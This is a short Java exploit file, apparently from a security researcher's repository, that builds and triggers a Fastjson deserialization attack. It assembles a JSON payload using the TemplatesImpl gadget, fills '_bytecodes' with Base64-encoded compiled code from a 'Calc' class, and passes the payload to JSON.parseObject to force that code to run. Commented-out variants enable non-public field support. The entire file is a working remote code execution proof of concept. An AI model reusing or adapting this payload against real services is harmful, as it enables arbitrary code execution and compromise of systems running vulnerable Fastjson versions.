package com.yyjccc.fastjson.exp;

import com.alibaba.fastjson.JSON;
import com.alibaba.fastjson.parser.ParserConfig;
import com.yyjccc.javassist.Calc;
import org.apache.commons.codec.binary.Base64;

public class test {
	public static void main(String[] args) {
		try {
			ParserConfig config = new ParserConfig();
			String evilCode = Base64.encodeBase64String(Calc.getCodeByte());
			final String NASTY_CLASS = "com.sun.org.apache.xalan.internal.xsltc.trax.TemplatesImpl";
			String text = "{\"@type\":\"" + NASTY_CLASS + "\",\n\"_bytecodes\":[\"" + evilCode + "\"],\n\"_name\":\"yyjccc\",\n\"_tfactory\":{ },\n\"_outputProperties\":{ },\n\"_translet\":{\"@type\":\"com.sun.org.apache.xalan.internal.xsltc.runtime.AbstractTranslet\"}}";
			System.out.println(text);

			//Object obj = JSON.parseObject(text, Object.class, config, Feature.SupportNonPublicField);
			Object o= JSON.parseObject(text,Object.class);
			//Object obj = JSON.parse(text1, Feature.SupportNonPublicField);
		} catch (Exception e) {
			e.printStackTrace();
		}
	}
}
